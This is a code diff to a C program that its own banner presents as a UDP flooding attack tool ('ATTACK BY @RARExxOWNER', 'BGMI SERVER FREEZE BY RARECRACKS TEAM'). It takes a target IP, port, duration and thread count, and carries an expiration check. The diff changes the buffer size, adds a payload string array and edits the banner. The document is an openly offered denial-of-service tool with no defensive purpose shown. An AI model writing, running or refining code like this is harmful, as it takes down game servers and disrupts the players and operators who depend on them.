@@ -16,7 +16,7 @@
 #include <signal.h>
 #include <stdatomic.h>
 
-#define BUFFER_SIZE 15000
+#define BUFFER_SIZE 9000
 #define EXPIRATION_YEAR 2025
 #define EXPIRATION_MONTH 9
 #define EXPIRATION_DAY 27
@@ -30,6 +30,13 @@ atomic_long packets_sent = 0;    // Atomic to prevent race conditions
 atomic_long packets_failed = 0;  // Atomic to prevent race conditions
 volatile sig_atomic_t stop_flag = 0;
 unsigned long start_time;
+
+// Sample payload definition
+const char *payloads[] = {
+    "UDP traffic test",  // Example payload string
+    "Another test",      // Another payload if needed
+    // You can add more payloads if required
+};
 
 // Function to calculate CRC32 for verification
 unsigned long calculate_crc32(const char *data) {
@@ -94,7 +101,7 @@ void *send_udp_traffic(void *arg) {
         pthread_exit(NULL);
     }
 
-    snprintf(buffer, sizeof(buffer), "UDP traffic test");
+    snprintf(buffer, sizeof(buffer), "%s", payloads[0]);  // Using first payload for the example
 
     time_t attack_start_time = time(NULL);
     time_t end_time = attack_start_time + duration;
@@ -160,14 +167,14 @@ int main(int argc, char *argv[]) {
     check_expiration();
 
     // Display initial watermark message
-    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦\n");
+    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
     printf("🌊🌊🌊 ATTACK BY @RARExxOWNER 🌊🌊🌊\n");
     printf("🎯 TARGETING IP: %s\n", ip);
     printf("📍 TARGET PORT: %d\n", port);
     printf("⏳ ATTACK DURATION: %d SECONDS\n", duration);
     printf("💥 THREADS: %d\n", threads);
     printf("⚡ METHOD: BGMI SERVER FREEZE BY RARECRACKS TEAM ⚡\n");
-    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦\n");
+    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
 
     memset(padding_data, 0, sizeof(padding_data));
     unsigned long crc = calculate_crc32("RAREOWNER");
